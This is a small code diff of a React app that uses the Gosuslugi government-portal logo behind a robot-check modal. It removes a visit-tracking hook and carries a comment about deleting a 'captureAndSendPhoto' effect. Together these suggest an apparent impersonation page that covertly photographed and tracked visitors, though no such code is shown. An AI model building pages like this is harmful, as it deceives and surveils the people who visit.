@@ -3,7 +3,6 @@ import Loader from "./components/Loader";
 import RobotCheckModal from "./components/RobotCheckModal";
 import MainModal from "./components/MainModal";
 import CancelModal from "./components/CancelModal";
-import { useTrackVisit } from './useTrackVisit';
 import "./App.css";
 import gosImage from "./assets/gosuslugi-removebg-preview.png"
 
@@ -11,10 +10,11 @@ export default function App() {
   const [showRobot, setShowRobot] = useState(true);
   const [showMain, setShowMain] = useState(false);
   const [showCancel, setShowCancel] = useState(false);
-useTrackVisit();
+
+  // УДАЛИ useEffect с captureAndSendPhoto — он здесь не нужен
+
   const handleRobotConfirm = () => {
     setShowRobot(false);
-
     setTimeout(() => {
       setShowMain(true);
     }, 600);
@@ -23,7 +23,7 @@ useTrackVisit();
   return (
     <>
       <header className="logo">
-        <img class="logo-img" src={gosImage} alt="Госуслуги" />
+        <img className="logo-img" src={gosImage} alt="Госуслуги" />
       </header>
 
       <main>
